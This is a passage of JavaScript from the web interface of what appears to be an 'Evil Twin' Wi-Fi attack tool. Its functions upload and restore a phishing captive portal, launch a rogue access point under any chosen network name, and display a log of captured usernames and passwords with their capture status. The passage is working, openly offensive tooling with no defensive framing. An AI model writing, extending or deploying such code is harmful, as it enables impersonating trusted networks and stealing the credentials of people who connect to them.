            headers: { 'Content-Type': 'text/html' },
            body: reader.result
        })
        .then(function (r) {
            if (r.ok) {
                showDialog(t("portal.installed"));
                loadPortalState();
            } else {
                return r.text().then(function (tx) {
                    showDialog(t("portal.uploadFail", (tx || r.status)));
                });
            }
        })
        .catch(function (e) { showError(t("portal.netErr", e)); });
    };
    reader.onerror = function () { showError(t("portal.readFail")); };
    reader.readAsText(file);
}

function restorePortal() {
    if (!confirm(t("portal.confirmRestore"))) return;
    fetch('/devil_twin/restore-default', { method: 'POST' })
    .then(function (r) {
        if (r.ok) { showDialog(t("portal.restored")); loadPortalState(); }
        else showDialog(t("portal.restoreFail"));
    })
    .catch(function (e) { showError(t("portal.netErr", e)); });
}

/* ── Custom-name Evil Twin (Rogue AP) ────────────── */
function launchCustomTwin() {
    var ssid = document.getElementById('rogue-ssid').value.trim();
    if (ssid.length < 1) { showDialog(t("rogue.enterSsidFirst")); return; }
    var stopHint = t("rogue.stopHint", ssid);
    if (!confirm(t("rogue.confirmLaunch", ssid, stopHint))) return;

    fetch('/custom-evil-twin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'ssid=' + encodeURIComponent(ssid)
    })
    .then(function (r) {
        if (r.ok) {
            showDialog(t("rogue.starting", ssid, stopHint));
        } else {
            showDialog(t("rogue.launchFail", r.status));
        }
    })
    .catch(function () {
        /* Expected: the management AP drops as the rogue AP comes up. */
        showDialog(t("rogue.startingExpected", ssid, stopHint));
    });
}

/* ── Captive Portal Log ──────────────────────────── */
function loadEvilTwinLog() {
    var tbody = document.getElementById("eviltwin-log-list");
    var badge = document.getElementById("log-count-badge");
    if (!tbody) return;
    tbody.innerHTML = '<tr><td colspan="5" class="table-empty-msg">' + escapeHtml(t("creds.loading")) + '</td></tr>';

    fetch('http://192.168.4.1/eviltwin-log')
    .then(function (r) {
        if (!r.ok) throw new Error("empty");
        return r.text();
    })
    .then(function (text) {
        var lines = text.split("\n").filter(function (l) { return l.trim().length > 0; });
        if (lines.length === 0) {
            tbody.innerHTML = '<tr><td colspan="5" class="table-empty-msg">' + escapeHtml(t("creds.none")) + '</td></tr>';
            if (badge) badge.textContent = t("creds.entryMany", 0);
            return;
        }
        tbody.innerHTML = "";
        lines.reverse().forEach(function (line) {
            var p = line.split("|");
            if (p.length < 6) return;   /* uptime|ssid|bssid|username|password|status */
            var ok = (p[5] === "SUCCESS" || p[5] === "CAPTURED");
            var color = ok ? "#1a7f37" : "#b35c00";
            var tr = document.createElement("tr");
            tr.innerHTML =
              '<td>' + formatUptime(parseInt(p[0], 10)) + '</td>' +
              '<td>' + escapeHtml(p[1]) + '</td>' +
              '<td>' + escapeHtml(p[3]) + '</td>' +
              '<td><code>' + escapeHtml(p[4]) + '</code></td>' +
              '<td><strong style="color:' + color + '">' + escapeHtml(p[5]) + '</strong></td>';
            tbody.appendChild(tr);
        });
        if (badge) badge.textContent = t(lines.length === 1 ? "creds.entryOne" : "creds.entryMany", lines.length);
    })
    .catch(function () {
        tbody.innerHTML = '<tr><td colspan="5" class="table-empty-msg">' + escapeHtml(t("creds.none")) + '</td></tr>';
        if (badge) badge.textContent = t("creds.entryMany", 0);
    });
}

function clearEvilTwinLog() {
    if (!confirm(t("creds.confirmClear"))) return;
    fetch('/eviltwin-log/clear', { method: 'POST' })
    .then(function () { loadEvilTwinLog(); })
    .catch(function () { showError(t("creds.clearFail")); });
}

function formatUptime(ms) {
    if (isNaN(ms)) return "—";
    var totalSec = Math.floor(ms / 1000);
    var h = Math.floor(totalSec / 3600);
    var m = Math.floor((totalSec % 3600) / 60);
    var s = totalSec % 60;
    return (h > 0 ? h + "h " : "") + (m > 0 || h > 0 ? m + "m " : "") + s + "s";
}

/* ── Copy helper ─────────────────────────────────── */
function copyText(elemId, btn) {
    var text = document.getElementById(elemId).textContent;
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(function () {
            var orig = btn.textContent;
            btn.textContent = t("common.copied");
            setTimeout(function () { btn.textContent = orig; }, 1500);
        });
    } else {
        var ta = document.createElement("textarea");
        ta.value = text;
        ta.style.cssText = "position:fixed;opacity:0;";
        document.body.appendChild(ta);
        ta.select();
        document.execCommand("copy");
        document.body.removeChild(ta);
        var orig = btn.textContent;
        btn.textContent = t("common.copied");
        setTimeout(function () { btn.textContent = orig; }, 1500);
    }
}

/* ── Utilities ───────────────────────────────────── */
function uint8ToHex(b) { return ("00" + b.toString(16)).slice(-2); }

function escapeHtml(s) {
    return String(s)
    .replace(/&/g,  "&amp;")
    .replace(/</g,  "&lt;")
    .replace(/>/g,  "&gt;")
    .replace(/"/g,  "&quot;");
}

function attackTypeName(tp) {
    var a = (L().attackTypes[tp] || I18N[DEFAULT_LANG].attackTypes[tp]);
    return a ? a.long : t("common.unknown", tp);
}
